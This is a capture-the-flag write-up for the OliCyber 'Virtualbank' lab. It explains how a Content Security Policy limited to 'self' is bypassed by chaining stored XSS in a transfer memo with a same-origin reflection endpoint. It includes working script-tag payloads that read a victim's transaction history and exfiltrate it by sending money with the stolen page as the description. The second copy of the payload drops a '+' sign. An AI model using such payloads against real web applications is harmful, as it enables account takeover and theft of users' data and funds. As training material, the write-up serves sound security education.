### Virtualbank - CSP 'self' bypass

We now turn our attention to the fifth practical engagement, which introduces an optional but highly instructive scenario designated as Virtualbank, accessible via the OliCyber training platform at [https://training.olicyber.it/challenges#challenge-133](https://www.google.com/search?q=https://training.olicyber.it/challenges%23challenge-133). The target application operates as a simulated online banking environment where authenticated users are allocated an initial balance of one thousand virtual coins and are permitted to execute financial transfers to other users, subsequently inspecting their incoming and outgoing movements through a dedicated transaction history interface. Each transaction incorporates a numeric amount alongside a free text memorandum, frequently referred to as a causale, which the application displays directly to the recipient when they review the transaction record.

The paramount complexity of this specific challenge arises from the defensive architecture implemented by the server, which actively transmits a restrictive **Content Security Policy** header within its Hypertext Transfer Protocol responses to govern client-side resource loading.



```HTTP
Content-Security-Policy: default-src 'self'; style-src https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css
```

Because the policy omits an explicit script source directive, the browser inherently falls back to the primary restriction established by the default source directive, which is explicitly set to the `self` keyword. This configuration categorically forbids the execution of inline scripts, inline event handlers, the `eval` function, and external scripts hosted on third party domains, meaning that the traditional payloads utilized in all preceding exercises will be systematically blocked by the client-side execution engine, regardless of their successful injection into the Document Object Model. The policy does, however, permit the browser to evaluate and execute scripts provided their source attribute points directly to the same origin currently hosting the application.

To successfully bypass this defensive implementation and achieve arbitrary JavaScript execution within the privileged administrative session to exfiltrate the target flag, the adversary must chain a persistent Cross-Site Scripting vulnerability with a reflected script loading gadget located upon the same origin. The fundamental objective requires the student to discover an application endpoint whose response body can be entirely controlled by user input, because that specific endpoint can then be injected into the Document Object Model and referenced as a seemingly legitimate same origin script source, deceiving the browser into executing the attacker payload while remaining perfectly compliant with the established security policy.

> The canonical methodology for defeating a Content Security Policy restricted strictly to the `self` keyword involves identifying same origin script loading gadgets, which frequently manifest as JSONP endpoints executing user defined callbacks, reflected parameters positioned inside inline scripts, or maliciously crafted uploaded files that the server delivers with a content type that the browser is willing to parse as executable code. This dynamic illustrates definitively that relying exclusively upon a `self` directive does not constitute a robust defense against Cross-Site Scripting, requiring modern policy implementations to combine cryptographic nonces, payload hashes, and strict dynamic directives to effectively neutralize such gadget hunting operations.





The reflection endpoint:

<img src="_attachments/Virtualbank%20-%20CSP%20%27self%27%20bypass_1.png" width="400">

The URI-encoded causale to reach the reflection endpoint:

```html
<script src="/error?msg=prova"> </script>
```

<img src="_attachments/Virtualbank%20-%20CSP%20%27self%27%20bypass.png" width="400">


The URI-encoded causale to fetch the first transaction and send money to myself:

```html
<script src="/error?msg=fetch(%27/history/1%27).then(r=%3Er.text()).then(t=%3E{fetch(%27/sendmoney%27,{method:%27POST%27,headers:{%27Content-Type%27:%27application/x-www-form-urlencoded%27},body:%27to=sher%26amount=1%26description=%27%2bencodeURIComponent(t)})})">
</script>
```

```html
<script src="/error/?msg=fetch('/history/1').then(r=>r.text()).then(t=>{fetch('/sendmoney',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'to=USER_NAME&amount=MONEY_AMOUNT&description=' encodeURIComponent(t)})})"> </script>
```


<img src="_attachments/Virtualbank%20-%20CSP%20%27self%27%20bypass_3.png" width="400">


<img src="_attachments/Virtualbank%20-%20CSP%20%27self%27%20bypass_2.png" width="400">